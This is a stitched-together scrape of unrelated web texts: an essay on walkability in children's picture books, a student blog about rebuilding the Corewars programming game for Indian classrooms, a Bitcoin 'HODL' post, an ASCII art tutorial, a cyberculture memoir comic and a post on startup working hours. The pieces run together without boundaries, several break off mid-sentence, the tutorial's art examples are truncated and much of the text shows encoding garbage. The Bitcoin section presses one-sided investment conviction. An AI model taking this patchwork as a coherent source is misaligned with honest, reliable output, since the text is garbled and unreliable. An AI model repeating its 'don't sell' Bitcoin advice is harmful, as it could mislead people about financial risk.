<p>The plots of the Frances stories of the 1960s and â€™70s written by Russell Hoban and illustrated by Lillian Hoban also revolve around walkability. Frances can walk to the general store and buy a tea set or a Chompo bar. Her trips on foot to her friendsâ€™ houses frequently initiate narrative adventure. â€˜Today is my wandering day,â€™ announces Francesâ€™s friend Albert, on which he likes to catch snakes, walk on fences and look for crow feathers. â€˜Wandering daysâ€™ in American suburbs, however, are infrequent or nearly impossible. Walkable environments preserve independence for the young, who are often the main characters in childrenâ€™s stories.</p>
<p>Both commutes are integral to the storiesâ€™ plots, enabling shenanigans for the zoo animals</p>
<p>Consider George and Martha as yet another example. The only cars we see them in are the bumper cars at the amusement park. The US writer and illustrator James Marshallâ€™s beloved hippopotamuses of the 1970s and â€™80s consistently engage meaningful, walkable destinations rather than sprawling subdivisions. They can hopscotch home after a visit to the store, comfort each other on their walk home from a scary movie, or push a bed to a picnic using roller skates.</p>
<p>In urban settings, walkability is closely <a href="https://transitcenter.org/wp-content/uploads/2016/07/Whos-On-Board-2016-7_12_2016.pdf" rel="nofollow noreferrer noopener">linked</a> to public transport, which is another narrative avenue for rich engagement with oneâ€™s environment. Accordingly, the number of picture books that feature trains and buses is significantly greater than the number of trains and buses that most Americans experience. Yet Iâ€™ve never seen a picture book that features a minivan or an SUV.</p>
<p>The zookeeper in Peggy Rathmannâ€™s <em>Good Night, Gorilla</em> (1994) lives within walking distance of the zoo. In Erin and Philip Steadâ€™s <em>A Sick Day for Amos McGee</em> (2011), the zookeeper takes the bus to work. Both commutes are integral to the storiesâ€™ plots, enabling shenanigans for the zoo animals.</p>
<p>Besides public transport, urban settings give other ample opportunities for their characters to explore their immediate environment. Cities are where weâ€™re more likely to find civic places, such as zoos, libraries or concert venues. Cities tend to have more diverse kinds of people and more intergenerational <a href="https://www.gu.org/resources/all-in-together-creating-places-where-young-and-old-thrive/" rel="nofollow noreferrer noopener">activity</a> in both public and private places than in suburbia. Good picture books such as <em>Benâ€™s Trumpet</em> (1979) by Rachel Isadora and <em>A Chair for My Mother</em> (1982) by Vera Williams exploit these opportunities in their stories.</p>
<p>Itâ€™s one thing to find enviable walkability in Esphyr Slobodkinaâ€™s <em>Caps for Sale</em> (1940) or Margaret and <span>H A Reyâ€™s</span> <em>Curious</em> <em>George</em> series (1941-66) or Ludwig Bemelmansâ€™s <em>Madeline</em> series (1939-61) â€“ books written by European Ã©migrÃ©s to the US well before American housing developments and â€˜big boxâ€™ stores became the dominant <a href="https://aeon.co/essays/step-by-step-americans-are-sacrificing-the-right-to-walk" rel="noopener">pattern</a> of land use in the mid-20th century. But to continue to find dynamic city living in bestsellers such as Bernard Waberâ€™s <em>The House on East 88th Street</em> (1962) or Mo Willemsâ€™s <em>Knuffle</em> <em>Bunny</em> (2004) is revealing. (That both stories feature beautiful Victorian brownstones as their backdrop is a bonus.) Celebrated American childrenâ€™s books authors such as William Steig, the creator of Shrek, and Tomie dePaola consistently chose pre-modern settings for their stories, so the suburbs hardly even had a fighting chance.</p>

<p>More than any other works of fiction, picture books depend on their setting. When the automobile dominates the setting, the narrative dies faster than a trip down a cul-de-sac. Even when there are private modes of transportation in childrenâ€™s literature, they are ships, bicycles or hot-air balloons, where the transported are engaged with the world around them and the adventure or mystery that this world brings.</p>
<p>What we donâ€™t find in <em>Goodnight Moon</em> is the old lady driving her Chevy Suburban out of her subdivision to a Wal-Mart</p>
<p><strong>Of course, childrenâ€™s books</strong> are not marked exclusively by the narrative. The illustrations arguably play an even more important role. And there are multiple reasons, aside from the fact that the stories lack suburban settings, to avoid illustrations of the suburbs. One is that contemporary suburbs are often ugly. Another is that sprawl is hard to fit into a page. So, naturally, we donâ€™t find good childrenâ€™s books that feature pictures of â€˜snout housesâ€™ (with a garage that protrudes in front of the house, and typical of suburbs in the US and Canada), strip malls or parking lots. Instead, we find beautiful illustrations of the countryside and forest, such as in Jane Yolenâ€™s <em>Owl Moon</em> (1987) about a girl and her father who set out in the snow to look for an owl, or of the vibrant cityscape, as in Mordicai Gersteinâ€™s <em>The Man Who Walked Between the Towers</em> (2003) about Phillippe Petitâ€™s high-wire stunt in Manhattan, or the Paris of the <em>Madeline</em> stories.</p>
<p>Sometimes, the pictures display such stunningly beautiful and rich environments â€“ such as in <em>The Mysteries of Harris Burdick</em> (1984) by Chris Van Allsburg, or <em>Sidewalk Flowers</em> (2015) by JonArno Lawson and Sydney Smith â€“ that they carry the story with few or no words at all.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1376/insert-sidewalk-flowers.jpg" alt="" title=""><figcaption>From <i>Sidewalk Flowers</i> (2015) by JonArno Lawson and Sydney Smith. <i>Courtesy Walker Books</i></figcaption></figure></div><div>
<p>In a number of cases, the setting for a childrenâ€™s picture book isnâ€™t relevant to the argument Iâ€™m making here because the setting has nothing do with the built environment or the natural environment. In some picture books (for example, Drew Daywaltâ€™s <em>The Day the Crayons Quit</em> (2013), illustrated by Oliver Jeffers) thereâ€™s really no setting to speak of. In other cases, the setting is entirely indoors or entirely fantastical. Itâ€™s not enough that a story takes place exclusively within a single-family home for it to count as suburban. Margaret Wise Brown and Clement Hurdâ€™s <em>Goodnight Moon</em> (1947) could well be suburban, but it also could be rural. What we donâ€™t find in <em>Goodnight Moon</em> is the old lady driving her Chevy Suburban out of her subdivision of single-family homes to a Wal-Mart for some sleeping pills.</p>
<p>Itâ€™s true that some popular picture books do seem to have a suburban setting: Victoria Kannâ€™s <em>Pinkalicious</em> series (2006-), the <em>Berenstain Bears</em> series (1962-) by the Berenstain family, and Norman Bridwellâ€™s <em>Clifford the Big Red Dog</em> (1963-) come to mind. But these books also come to mind when I consider books Iâ€™d rather burn than read â€“ not because they take place in the suburbs but because theyâ€™re so poorly written and illustrated. My only claim here is that <em>the best</em> childrenâ€™s books forgo suburbia.</p>
<p>There are, nevertheless, some exceptions to this rule. In Judith Viorst and Ray Cruzâ€™s classic 1972 picture book, for example, Alexander appears to be chauffeured around the suburbs by his mother; in that scenario, who wouldnâ€™t be having a terrible, horrible, no good, very bad day? But for every quality picture book that has a suburban setting, there are 100 that donâ€™t.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1375/inset-Town-Mouse-Country-Mouse-T9MMF4.jpg" alt="" title=""><figcaption>Illustration for Aesopâ€™s fable <i>The Town Mouse and the Country Mouse</i>. <i>Photo by Alamy</i></figcaption></figure></div><div>
<p>At least since Aesopâ€™s fable <em>The Town Mouse and the Country Mouse</em>, many childrenâ€™s stories exhibit a kind of anti-urban romanticism, of which Virginia Lee Burtonâ€™s <em>The Little House</em> (1942) is one memorable example. Cities are dangerous and dirty places in contrast to the idyllic countryside. Books set in cities often react against this trend by showing the benefits of city life. Yet this counter-reaction is, arguably, guilty of romanticising the urban. Childrenâ€™s books that use pedestrian settings, whether urban or rural, fall prey to both kinds of romanticisation, displaying exclusively the attractiveness of a walkable town or a tranquil forest. However, the accuracy of these portrayals is not the point of the settings. Rather, their job is to serve the narrative and delight the reader.</p>
<p>Childrenâ€™s literature thrives on imaginative or surprising encounters, which need a geography that creates mischief and curiosity. But the suburbs, for all their benefits in real life, are places that in childrenâ€™s literature lack imagination, or at least donâ€™t provide suitable stage-sets for imaginative adventure and exploration: …</p></div></div></div>

Eamon and I are  both first year students at the Olin College of Engineering at the time of publishing. </p><h2>The ‘abstract’ - a big picture overview of what we did:</h2><p>Over our first semester at Olin, in an entrepreneurial spirit we learned and redeveloped Corewars: a 30 year-old computational-thinking game. Corewars was fascinating because of its potential to be used as a powerful logical programming framework. The way players could use simple assembly commands to execute code visually and manipulate data held much promise for complex logical problem-solving both in a competitive or collaborative nature. </p><p>After eye-opening discussions with Indian engineering and computer science professors, it appeared that there was a need for a scalable method to build students’ creative problem solving skills. We developed Corewars as a game-based educational software, similar to MIT’s Scratch in some ways. At the end of the semester, as Adi had a chance to visit India, we completed development and used the game as a teaching tool for undergraduate computer science students. We tested the game and pedagogy by presenting the approach and teaching the game to groups of professors and students in person at India’s premier private research university.</p><p><strong>View what we <a href="https://corewarstechalpha.herokuapp.com/">built in action</a> or the <a href="https://github.com/aramachandran7/corewars">source code</a>!</strong></p><p>Below, we document our process, learnings, and what we seek to do in the future in detail.</p><p><undefined>

    </undefined>  </p><p><em>Eamon and I before we knew what we were getting ourselves into</em></p><h2>The Backstory</h2><p>Last September, as two first-year engineering students who’d just hardly moved into Olin, Eamon and I realized we wanted to work together on “something something entrepreneurship”. It was vague, it was naïve, but it was genuine.</p><p>After a <em>painful</em> ideation process, echoed by other college students interested in entrepreneurship, we eventually settled in the education space. </p><p>Adi had been talking with a machine learning professor, born and raised in the USA, who now teaches masters students at a top ranked private university in India. At the time, the professor, Amar, had been complaining about some of his masters students. </p><p>They struggled to creatively problem-solve. </p><p>Amar would give them an open ended engineering challenge - perhaps to optimize a device for weight, or to increase the efficiency of an algorithm. Instead of asking follow up questions, inspecting the device or reading through the algorithm, most of Amar’s students would ask him one simple question. </p><p><em>‘Sir, what is my next step?’</em> </p><p>Students would have the tendency to expect to be spoon fed; they were expecting problems like what you’d find in a text book, where Amar would have the answers and he was simply waiting for them to get the problem right or wrong. </p><p><strong>Yet no engineering projects or challenges or jobs are like this</strong> - they’re open ended, require creativity, problem-solving and collaboration skills (yes, let’s just throw all the buzzwords in). </p><p><strong>We’ve heard that from a young age, many Indian students are taught by the education system that education is the ability to pass tests and memorize or ‘mug’ facts, formulas, or spellings.</strong> </p><p>For Amar, he could spend hours with each student in 1:1’s, working through open-ended challenges and helping his students develop a better creative edge. But no professor has that amount of time. Moreover, we believed that Amar’s problems were echoed throughout the country. <strong>Our question became, how do you build creative intuition for students, at scale and cheaply?</strong></p><p>So that was it. Naively, we set out on our journey to solve what we liked to call the ‘creativity-problem’ in the Indian education system. Get students to problem solve with an entirely different mental framework. Somehow figure out a curriculum or an exercise radical enough to undo ~14 years of teaching. </p><p>And on top of all this, whatever we made magically needed to be business-viable. We needed to balance our desire for solving important social problems with creating a sustainable product that people would use.</p><h2>The Start</h2><p>Initially, we knew nothing about the space, other than what Amar had told us. Therefore, we figured we had to start with talking to people. We assumed that because of the very bureaucratic state of the majority of India’s top  engineering / technical institutions, selling any software to institutions / universities would be downright impossible. </p><p>And students wouldn’t be the ones paying for software like this - they had no idea that the ‘creativity-problem’ was even a problem. Thus professors became our target market. <strong>Talking to Indian engineering professors was our first step.</strong> Through one connection or another, we tracked down and interviewed a number of engineering and computer science professors from IIT, NITT, BITS Pilani, and a couple other highly ranked Indian engineering schools.</p><p>While verifying the ‘creativity-problem’ was the focus of our interviews, we focused on asking open-ended questions to get a better feel for the space we were in. </p><p>Our interviewing style and questions looked something like this. </p><p><em>Describe, in-depth, some of the problems within the undergraduate engineering education system? What about solutions you’ve seen? If you could change one thing about the system, what would it be?</em> </p><p><em>Questions about students - What do you like about your students? What do they do particularly well in? What does your ideal class / teaching style look like, and what is it usually like? What’s preventing you from achieving this?</em></p><p>To summarize our interviews, Indian professors described to us a world unlike anything we’d ever seen. It almost seemed like if we had been interested in the Indian higher ed space, Amar wouldn’t have been the right person to start off with. He was an extreme early adopter, an extreme edge case with very progressive educational opinions. Most of the professors we talked to were nothing like him, and appeared mostly ok with the status quo. </p><p>And after talking to a few students, the picture changed more, both filling in some gaps, but also confusing us even more. </p><p>Here’s a rough picture we formed in our heads combining what we heard from engineering/CS students and professors. </p><ul><li>The overall large lecture hall environment isn’t conducive to students being engaged in class. Although teachers complain about some of their students’ internal motivation for learning, teachers themselves often aren’t thinking about feedback or changing their own instructional styles. </li><li>While not the case in every college, in certain courses the only metric for student learning is the final - incentivizing students to not attend lectures and memorize the content the night before. </li><li>And lastly, for many students, college represents a tremendous amount of newfound freedom. This can mess with their ability to study, work hard, and stay motivated; and oftentimes, a student culture of procrastination and disengagement can be prominent and even will spread to motivated students. </li></ul><p>These problems are really tough. We were taken aback after hearing the students’ perspectives the first time, especially coming from a place like Olin. </p><p>But Amar had convinced us that these were problems worth solving, no matter their difficulty; giving up was not an option. We decided that we wanted to brainstorm more and try mashing together our ideas with some of the problems we’d heard through interviews. </p><p>Here are the needs that we believed professors had.</p><ul><li>Reduce what we called the Gap - incoming undergraduate engineering and CS students’ backgrounds, motivation, and pre-existing knowledge was extremely varied, and resulted in some students not being satisfied with the content. </li><li>Increase student motivation - from the professors’ point of view, many students weren’t there to do much other than pass the tests.  </li><li>Enable professors to engage more closely with students’ current culture - professors felt like they were out of sync with the students and their habits.  </li><li>Increase employability - how easy it was to get a job out of college was a key metric that was brought up by professors several times. </li></ul><h2>What we decided to do:</h2><p>With this all in place, we decided to move forwards with a <em>game based software</em> that: </p><ul><li>Would have a low ‘barrier of entry’<ul><li>Be easy for students from any background to pick up </li><li>Be visual and simplistic to wrap your head around</li><li>Have some level of a competitive / addictive nature and well defined metrics of success</li></ul></li><li>Act as a teaching tool to build students’ creativity and collaboration skills</li><li>Be at least tangentially related to engineering / CS </li><li>Have a way for teachers to track progress, assign grades, etc. after giving it to students as a ‘homework’ assignment</li></ul><p><strong>Games still require the open-ended problem solving that makes projects so hard, but at the same time don’t require learning technical skills.</strong> This meant that students could focus on learning and practicing problem solving skills, without the overhead of having to pick up new technical skills.</p><p>We decided to rebuild, reimagine, and repurpose an old computer game - Corewars - for the task. Corewars is a game from the 80’s, where two programs fight it out over a limited memory buffer. It’s interesting because the programs exist within the same memory buffer that they are trying to take over — each program’s code can be modified, overwritten or even hijacked by the opponent. The programs themselves are written in a pseudo assembly language called Redcode, with 23 commands including simple operations like adding and multiplying, to more complicated ones that can create new processes or copy memory.</p><p>The technical challenges we faced can be broadley broken up into backend and frontend implementation. For the backend, we had to create what was in essence a simple assembly compiler. It would have to take in two processes written in Redcode, then execute them in an empty memory buffer. For the frontend, we had to create a clear visualization of what the processes were doing, and also had to …</p></div></div>

<p>Not Being Bullish Enough on Bitcoin is a big mistake. Why? You’ll sell too early, and not grasp Bitcoin well enough to get the big picture here. You might not secure the coins well enough, and you might not actually realise the societal implications of Bitcoin. </p>



<h2>Not Being Bullish Enough On Bitcoin Means Selling too early</h2>



<p>Fundamentally, a lot of people did not truly peer into <a href="http://stephanlivera.com/185">what Bitcoin is</a>, and this made them not bullish enough. This is a big error, as it pushes them to sell bitcoin too early. While they think they’re being clever timing a top, Bitcoin proceeds to humble them a few years later after another cycle. </p>



<p>Lopp has a great example here: </p>



<figure></figure>



<p>At time of writing in Dec 2020, Bitcoin is now around $23,000 USD. Selling early is penny wise, pound foolish. </p>



<p>Many people wish they had bought bitcoin earlier, but truth be told: that’s only half the challenge. The other half is actually HODLing it through the long term and not selling it out. </p>



<p>As bitcoin old-timers in the space will tell you, you could have bought early… but then you probably would have also sold early. It takes understanding and conviction.</p>



<h2>Not Being Bullish Enough On Bitcoin Means Not Securing it Correctly</h2>



<p>It’s a wild roller-coaster. Bitcoin can 10x in the space of a few months, and you can be left <em>very</em> exposed if you’re not careful. A $10k bitcoin stack can quickly become $100k, a $100k stack can quickly become $1M and so on. </p>



<p>Consider the worth of your stack currently, and think about if Bitcoin were to 10x or 20x over a few months or a year. Would you be comfortable with the level of security you have? </p>



<p>If you aren’t bullish enough, and you’re only looking for a 2x and then flip for fiat profits, you aren’t thinking big enough. You should be looking to learn about bitcoin security by listening to SLP such as <a href="http://stephanlivera.com/97">SLP97</a> and <a href="http://stephanlivera.com/215">SLP215</a> with Michael Flaxman. You should be looking at ways to: </p>



<ul><li>Ensure appropriate entropy in your bitcoin seed generation </li><li>Minimise single points of failure</li><li>Consider multi signature</li><li>In the ideal case, use open source hardware and software that has been vetted from a security perspective</li><li>Learn about how to verify signatures for software you use</li><li>Learn hardware wallet best practices</li></ul>



<h2>Not learning enough about how to use Bitcoin the right way</h2>



<p>When we talk about using Bitcoin, we mean using it in a self sovereign way. You shouldn’t be in a situation where you are exclusively trusting or relying on your service provider to give you your bitcoins. </p>



<p>This is not stocks or dollars in your bank account. This is Bitcoin. Use it the self sovereign way. </p>



<p>In practice this means: </p>



<ul><li>Don’t leave your coins in custodial accounts. Use sovereign bitcoin wallets where you hold the private keys. Or at least, a quorum of private keys (e.g. you hold 2 of 3 keys, or 4 of 5 keys). </li><li>Ideally, perform your own validation by running your own underlying bitcoin node. This is easy with <a href="https://www.ministryofnodes.com.au/2020/09/28/cost-effective-bitcoin-use-hardware-wallet-own-node/">Specter Desktop + Bitcoin Core</a>, or with <a href="https://www.ministryofnodes.com.au/2020/03/26/mynode-video-tutorials/">myNode</a>, or other projects e.g. Umbrel, <a href="http://raspiblitz.com/">RaspiBlitz</a>, <a href="http://ronindojo.io/">Ronin Dojo</a>, <a href="http://btcpayserver.org/">BTCPay Server</a>, <a href="http://nodl.it/">nodl</a> etc. </li></ul>



<h2>Not realising the societal implications of Bitcoin</h2>



<p>Fiat money has cultural consequences that many simply do not understand right now. It’s like we’re fish swimming in the water without realising what we’re swimming in. We’ve grown up in an environment of cheap debt, facing incentives to go into debt or lose. </p>



<p>This drives all kinds of changes in our society that weren’t so obvious pre-1971. Increased welfare statism, increased debt, higher time preference, increased centralisation into managerial superstates, to name a few. </p>



<p>As Bitcoin becomes more widely adopted, society’s return to hard money will drive significant cultural shifts that align with the return to hard money. Listen to <a href="http://stephanlivera.com/51">SLP51 with Guido Hulsmann</a> to know more.</p>



<h2>Conclusion</h2>



<p>Fundamentally, it takes knowledge, conviction, and dedication to do this. There are many pitfalls along the way, and it takes work from the HODLer to methodically and skilfully avoid these pitfalls. Of course, we can lament the difficulty and push it off til the future when it’ll be easier. But that is also giving up the huge return potential, and also the freedom and moral imperative of bringing about a Bitcoin Standard. </p>



<p>Do your research and learning, be methodical in your approach, and you’ll be in with a good shot. </p>

</p><h2>1 Introduction</h2>

<p>ASCII is an acronym of "American Standard Code for Information
Interchange". ASCII art means art made out of different characters in
the ASCII map and can thus be represented in plain text format. It
cannot include extended characters or text formatting such as bold or
italics. ASCII art is always done on a fixed-width font like Courier
New or Fixedsys, never on a proportional font like Arial or Times New
Roman. It can be made in Notepad or MS-DOS Edit, but there are also
some specific programs for making ASCII art. And no, I'm not talking
about ASCII converters.</p><p>
People often comment on ASCII art by saying "Wow, that is so amazing,
I'd never have the patience to make something like that". I don't get
it. Why do they think ASCII art requires so much patience? I can make a
decent fullscreen ASCII in an hour (even if it sometimes takes ten
hours). It takes me at least fifteen hours to draw a decent fullscreen
CG picture.</p><p>
ASCII art isn't easy and it does require skill, but you don't have to
care about things like brush strokes or colors and usually not about
shading either. In a way it is a lot like pixel art. When I started
pixeling it felt very familiar due to my ASCII and ANSI experience.
Pixel artists will probably experience a similar reaction when they
start drawing ASCII. You don't have to have great drawing skills to be
a good ASCII artist. I, for instance, suck at drawing, I can paint but
I can't do the sketch like thing at all. ASCII sketching is practically
something non-existant, but if this interests you, nothing stops you
from trying this new style.</p><p>
Some people wonder what's the point. What's the point in making art in
general? I think limitations are what makes art interesting and feeds
the creative mind. ASCII art probably isn't something that you
encounter in an art museum (which is regrettable), it's more like
everyday art. I guess it has something in common with pop art. ASCII
art can be sent via email or to Usenet newsgroups, it can be
used on IRC and many chatrooms (do that with caution, though). You can
include ASCII art in your signature or login screen or print it out
with your old matrix printer. It can be used for representing game
situations, graphs or molecular models.</p><p>
I've heard opinions of ASCII art not being art but graphical design,
but I disagree with that. Design is usually considered to be something
functional, such as advertisements or interfaces, while visual art is
something you can hang on your walls. ASCII art usually isn't
functional but aesthetical. I know people who have ASCII pictures
hanging on their walls.</p><p>

There are other ASCII tutorials, but I decided there's still room
for another one. Many of the others are outdated, some are even more
than 10 years old. They also feature slightly different techniques and
lack some of the parts that my tutorial focuses on. This turned out
perhaps more like a ASCII drawing/culture FAQ than an actual tutorial,
but I hope it will still be useful.

</p><h2>2 Types of ASCII art</h2>

<h4>2.1 Lineart</h4>

<div><p>Lineart is just what its name implies, things are represented with
(usually thin) outlines, sometimes dotty, sometimes consisting mostly
of slashes, underscores and pipes. Lineart also includes most FIGlet
fonts and demoscene logos. Suitable for both huge images and tiny
pictures.</p></div><pre>            .-"""-.

<h4>2.2 Solid</h4>

<div><p>Solid art is the "opposite" of lineart, it's not outlined but filled
and flat-shaded.
It's often best fit on mid-sized and large pictures, though it can also
work for small pieces, such as the heart here. Often it looks better
than lineart, simply for the fact that it's not as "thin". Solid art is
often used for logos, ornament designs and text, but it fits almost any
kind of subject. It's not very well suited for faces though.</p></div><pre>  ,o8o, ,o8o,

<h4>2.3 Grayscale</h4>

<div><p>Grayscale is like solid art, but it consists of many different
characters that are used to portrays lighter and darker areas, making
it the most suitable kind of ASCII for picturing faces. It is usually
best viewed white on black, such as the example below (people using
most graphical browsers can select it with a mouse or press Ctrl-A to
see it in inverse color). Most converters create grayscale art, though
rather messy kind with often no antialiasing. Grayscale could be
considered the most difficult of all ASCII techniques.</p></div><pre>                           .,,,yyyy@@yyyyy,,,

<h4>2.4 Camelized</h4>

<p>Camelized ASCII art isn't very popular, even though it already appeared
in
the book Alice in Wonderland. It is usually poetry (sometimes prose)
made into the shape of an object, often an animal. There are a couple
of different techniques for making the shapes. Some people use extra
spacing to achieve lines of required length, others wrap words from the
middle or use extra characters. JavE has a feature for camelized ASCII.

			This much I knew:
			<br>
				In the future, all cities would look like the one that appeared behind Kaptain Kool &amp; the Kongs on Saturday morning's <i>Krofft Supershow</i>. Bloated, curvaceous structures — engineered by the same people who designed Corvette Stingrays and Yes album covers — built out of shiny fiberglass, pristine chrome, and pulsating neon light -- Tomorrow's city would be a Space Age coral reef, teeming with millions of funky life forms, its limitless nooks and enclaves seething with parties, discos, arcades, and mind-blowing good times....

			My van would be more than just a mode of transportation... It would be my spaceship for navigating the Strip.
			<br>
				The Strip would eventually encompass the world. Domed cities would interconnect across continents , and hamster-tube highways would extend down into the ocean so that you could cruise the aquatic sea-cities. 
			<br>
				Your van could literally take you anywhere on Planet Earth. Maybe not as fast as a Concorde jet, but speed wasn't important. Getting there was all the fun.

			Eighties were going to be so <i>vast</i>, so <i>profound</i>, that the job market would be unrecognizable by the time I entered the workforce.
			</p><p>
			
				Nearly any job I trained for now would be obsolete by 1990. Computers and solar-powered robot factories would be doing most of the work. Consumer goods would be mostly free, and the U.N. would be paying us all not to work.

			The important things in human life — sex, technology, hedonism, and the peaceful exploration of inner and outer space — these would occupy most of our time as a new Golden Age dawned for humanity. No matter where you went, you would find millions of groovy freaks boogying down, partying hearty, and tossing off symphonies, rocketship designs, and cures for cancer as freely as a tree drops fruit. Human civilization would have truly begun....

I do, however, have a job. It just doesn't <b>pay</b> enough.

I'm not going anywhere in particular. I just have to lose myself in the suburbs for a few hours. I'll creep back later in the day. Hopefully my housemates will be gone and I can sneak back into my room.

			When school ended last month, I had to live <i>somewhere</i>. Of course, with a terrible credit rating like mine,
			(that trail of busted credit cards littering my passage through an "academic career") and no money for a deposit, 
			it wouldn't be easy to find a place. 
			</p><p>
			My current housemates, fortunately, didn't check my credit or ask for anything upfront... they naively assumed that since I was in college, I must be a solvent young bourgeois like themselves.
</p><p>
I did nothing to disabuse them of this illusion.

		The locale I'm trapped in is<b> Santa Luna,</b> California, a sleepy seaside college town 

 situated 50 miles west of Silicon Valley. If exciting things are happening in Silicon Valley, 
you surely won't hear about them here. 

Santa Luna is its own self-contained bubble reality, a sort of hippy-dippy alternate universe that might have branched off from ours
if McGovern had won the 1972 presidential election. 
</p><p>
Tourists call this town "charming." For me, being stuck here after I've  graduated
feels a lot like bathing in my own urine.

For those of you who either weren't alive, or weren't paying attention at the time:
</p><p>
Back in 1983 an old acidhead named William Gibson sat down at his
Hermes 3000 manual typewriter and banged out what was to become
the most popular science fiction novel of that decade...
</p><p>
Concerning people plugging their brains directly into their
computers, Gibson's novel was originally titled <i>Jacked In.</i></p><p>
The publishers feared this sounded too much like "jacked off",
and changed the title to a more marketable <i>Neuromancer</i>.

<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_neuromancer.gif"></p><div><p>


This little book of his was to cause quite a stir...</p><p>

<i>Neuromancer</i> had a tremendous cultural impact, not the least of which was the introduction of a new word into the English language 
— <i><b>cyberspace</b></i>.
</p><p>
In subsequent years, the prefix "cyber-" sort of broke off and did its own <i>thing...</i></p></div>

	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_cyberexpo93.gif"></p><div><p>
Which brings us to the year 1993 and the first annual <b>“Cyber Expo.”</b></p><p>

For the past few years I had been reading about a newly emerging <b> “cyberculture” </b>
in exciting new magazines with names like <i>Phringe Surfer, FutureShock, Cyborgasm, Digital Frontier</i>, and <i>Fast Forward.</i></p><p>
In May of 1993 I scraped together my month's grocery money and made the Greyhound bus trip to San Francisco. 
I was <i>finally</i> going to meet the movers and shakers of this cyberculture face to face!
Smart drug entrepreneurs, multimedia artists, hackers, inventors of mindblowing new technologies,
<i>all</i> would be congregating here in this one space.

It was already 1993, and the future  I'd imagined in 1978 was running a little behind schedule.</p><p>

Was it possible that here and now, the future was off to a proper start?</p><p>

Would I  finally  find the community I'd always hoped for? </p><p> Would I, at last,  discover  “my” people?

The presentation was called “Cyber Revolution: Power to the People” and it was attended by some of the hippest of the California "Digerati".
</p><p>
I took the opportunity to buttonhole an editor I'd been petitioning for several months. His name was Sparky West and he was editor-in-chief of 
<i>Fast Forward</i>, one of the seminal cyberculture magazines.
</p><p>
Their motto: <i>"Made for the Smartest People on Earth."</i></p><p>
(Yes,<i> I know.</i> That should have been my first warning.)

808 and Guinness proved to be a bad mix; but then, I wasn't really in a partying mood to begin with.

Stoned ravers stampeding in to empty their bladders of all the $7-a-bottle mountain-spring water

</p><p>

I knew I was taking more than my fair timeshare in this stall, so I wasn't too surprised when this random guy came barging in..... obviously needing the toilet for the same reasons I did...

</section>
<p>When I joined my first startup almost ten years ago, most of the prevailing wisdom about startups said that you should be ready for an 80-hour per week grind. So, I made it my mission to work longer and harder than anyone else on the path to success.</p>
<p>At that time, I didn’t have a family, significant other, or many hobbies outside of work, plus I liked my job, so it was relatively easy to put in long hours and work weekends. While I did a lot of tasks in those early days, looking back, I realize that <em>I didn’t actually accomplish much.</em></p>
<p>After working for three early-stage startups and <a href="https://www.karllhughes.com/posts/cto-writer">founding my own in 2020</a>, I’ve talked to countless founders about startup hours, pacing, burnout, and hustling. I’ve since seen a lot of founders fall into the trap of working more hours instead of working smarter, so in this post, I’ll give you my perspective on why this happens. Finally, I’ll share a few things that I’ve learned about maintaining balance in a startup from both an employee’s and founder’s perspective.</p>
<h2 id="typical-startup-hours">“Typical” Startup Hours</h2>
<p>One of the challenging things about joining a startup is that there are rarely “typical” work hours. Some startups expect employees to be in the office from 8 am to 8 pm every day and answer emails on the weekend, while others might allow complete flexibility with very little concern over hours worked.</p>
<p><strong>While it’s <a href="https://www.karllhughes.com/posts/myths-working-engineer-startup">a myth that every startup requires you to work overtime every week</a>, most startup employees put in 50-60 hours per week, and many founders put in 60-100 per week.</strong></p>
<p>The problem with long hours is that they’re counterproductive:</p>
<blockquote>
<p>“John Pencavel found that productivity per hour declines sharply when a person works more than 50 hours a week. After 55 hours, productivity drops so much that putting in any more hours would be pointless.

<p>Your body ultimately needs sleep, food, relaxation, and <a href="https://www.gq.com/story/how-and-why-you-should-be-bored"><em>even boredom</em></a> to function properly. This is especially true for those of us who do <a href="https://www.wired.com/story/eight-hour-workday-is-a-lie/">high-concentration, creative work</a> (like writing, programming, and strategic thinking).</p>
<p>One of my favorite reads in 2019 was <em><a href="https://amzn.to/2WjbkL5">Bored and Brilliant</a></em> because it reminded me of the need to put down my phone and just think every once in a while. Regular introspection leads to clarity, focus, and prioritization that is extremely valuable as a startup founder.</p>

<h2 id="why-are-startup-hours-so-long">Why Are Startup Hours so Long?</h2>
<p>So if the research is against long hours for most people, why do startup founders work so much? And, why do they, in turn, expect their employees to do the same?</p>
<p>There are four factors I see at play in defining startup working hours:</p>
<h3 id="1-hustle-culture">1. Hustle Culture</h3>
<blockquote>
<p>“I don’t think it’s fair for people to say that they work 100 hours. That’s just a PR move, like when Elon Musk sleeps on a hard couch in a meeting room. Why couldn’t he have a nice bed delivered to his office?” - <a href="https://www.quora.com/How-many-hours-per-day-do-startup-employees-work-compared-to-those-at-a-regular-company/answer/Nope-Nope-351">Anonymous opinion on Quora</a></p>
</blockquote>
<p>You might think of startup founders as original, free-thinking, creative people, but most of them are just as vulnerable to peer pressure and cultural norms as any of us. So, when high-profile startup founders report that they <a href="https://www.businessinsider.com/elon-musk-sleeps-under-desk-as-tesla-faces-model-3-production-goals-2018-6">slept at the office</a>, other founders see this as a template for success. Some even <a href="https://hbr.org/2015/04/why-some-men-pretend-to-work-80-hour-weeks">lie about the number of hours they work</a> because of the cultural pressure to put in more time.</p>
<h3 id="2-work-life-separation-is-dwindling">2. Work-Life Separation is Dwindling</h3>
<p>It’s even harder to “unplug” from work when your office is six feet away from your bedroom, and your phone goes to bed with you at night. Now that more companies are going remote, employees <a href="https://www.cbsnews.com/news/covid-19-lockdown-work-from-home-day-one-hour-longer/">are working longer hours</a> and having more meetings in what would be off-hours.</p>
<p>The problem is even more pronounced for startup founders. They are often betting their financial future on their new business or so wildly passionate about the problem they solve that it’s next to impossible to “turn it off.”</p>
<h3 id="3-external-pressure">3. External Pressure</h3>
<p>Building a business requires making promises to a lot of people. As a founder, you’re telling employees that they’ll have a job, you’re telling customers that you’ll deliver value, and you’re promising your family that all this sacrifice will be worth it someday. These pressures are amplified when startups raise money because venture-funded startups have a board who might watch the founders closely to make sure they’re working as hard as possible to get them the return they expect.</p>
